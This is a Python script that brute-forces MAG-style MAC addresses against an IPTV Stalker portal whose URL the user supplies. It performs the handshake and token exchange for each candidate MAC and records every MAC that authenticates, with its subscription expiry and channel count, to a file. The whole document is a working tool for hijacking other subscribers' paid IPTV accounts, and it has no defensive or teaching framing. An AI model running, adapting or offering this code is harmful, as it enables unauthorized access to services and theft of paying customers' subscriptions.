import requests
import json
import sys
from datetime import datetime
from urllib.parse import urlparse

def generate_mac_combinations(prefix: str = "00:1A:79:", start_from: str = None) -> str:
    start = 0
    middle = 0
    end = 0
    if start_from:
        start_parts = start_from.split(":")
        if len(start_parts) == 3:
            start, middle, end = [int(part, 16) for part in start_parts]
        else:
            print("Invalid start_from format. Expected three hexadecimal parts.")
            sys.exit(1)

    max_hex_value = 256  # Up to FF in hexadecimal
    for i in range(start, max_hex_value):
        for j in range(middle if i == start else 0, max_hex_value):
            for k in range(end if j == middle else 0, max_hex_value):
                yield f"{prefix}{i:02X}:{j:02X}:{k:02X}"

def print_colored(text: str, color_code: str) -> None:
    print(f"{color_code}{text}\033[0m")

def main():
    try:
        #base_url = "http://honeywatch.net:80"
        base_url = input("Enter IPTV link: ")
        parsed_url = urlparse(base_url)
        host = parsed_url.hostname
        port = parsed_url.port

        if port is None:
            port = 80

        base_url = f"http://{host}:{port}"

        current = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        
        user_mac_input = input("Enter a full MAC address to start from or press Enter to start from beginning: ").strip().upper()
        base_mac = "00:1A:79:"
        start_from = None

        if user_mac_input:
            if user_mac_input.startswith(base_mac):
                start_from = user_mac_input.replace(base_mac, "")
            else:
                print_colored("Invalid MAC address format. Please ensure it starts with '00:1A:79:'.", "\033[91m")
                return

        for mac in generate_mac_combinations(prefix=base_mac, start_from=start_from):
            try:
                s = requests.Session()
                s.cookies.update({'mac': f'{mac}'})
                url = f"{base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

                res = s.get(url, timeout=10, allow_redirects=False)
                if res.text:
                    data = json.loads(res.text)
                    tok = data['js']['token']

                    url2 = f"{base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {"Authorization": f"Bearer {tok}"}
                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)

                    if res2.text:
                        data = json.loads(res2.text)
                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
                            mac = data['js']['mac']
                            expiry = data['js']['phone']
                            # Third request (Get group title amd id)
                            url_genre = f"{base_url}/server/load.php?type=itv&action=get_genres&JsHttpRequest=1-xml"

                            # Attempt to fetch the group id and title
                            res_genre = s.get(url_genre, headers=headers, timeout=10, allow_redirects=False)

                            group_info = {}

                            if res_genre.status_code == 200:
                                id_genre = json.loads(res_genre.text)['js']
                                for group in id_genre:
                                     group_info[group['id']] = group['title']

                            # Fourth request (get all channels)
                            url3 = f"{base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"

                            # Attempt to fetch the channel list
                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
                            count = 0
                            if res3.status_code == 200:
                                channels_data = json.loads(res3.text)["js"]["data"]
                                for channel in channels_data:
                                    count = count + 1
                            else:
                                print_colored("Failed to fetch channel list", "\033[91m")
                            print_colored(f"MAC = {mac}\nExpiry = {expiry}\nChannels = {count}", "\033[92m")  # Green
                            with open(f"{host}_{current}.txt", "a") as f:
                                f.write(f"{base_url}/c/\nMAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n\n")
                else:
                    print_colored(f"No JSON response for MAC {mac}", "\033[91m")  # Red
            except json.decoder.JSONDecodeError:
                print_colored(f"JSON decode error for MAC {mac}: No valid JSON response.", "\033[91m")  # Red
            except Exception as e:
                print_colored(f"Error for MAC {mac}: {e}", "\033[91m")  # Red
    except KeyboardInterrupt:
        print_colored("\nProcess interrupted by user. Exiting...", "\033[93m")  # Yellow
        sys.exit()

if __name__ == "__main__":
    main()